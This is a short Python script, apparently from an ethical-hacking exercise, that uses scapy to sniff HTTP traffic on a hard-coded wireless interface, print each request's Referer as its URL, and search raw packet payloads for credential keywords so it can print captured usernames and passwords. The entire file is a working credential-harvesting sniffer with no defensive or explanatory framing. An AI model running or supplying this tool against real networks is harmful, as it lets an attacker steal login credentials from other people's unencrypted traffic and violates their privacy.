#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Referer)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # print(packet[scapy.Raw].load)
        load     = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "usr", "pwd", "login", "password", "passwd", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request --> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username & Password combination --> "+ login_info +"\n\n")

sniff("wlp3s0")
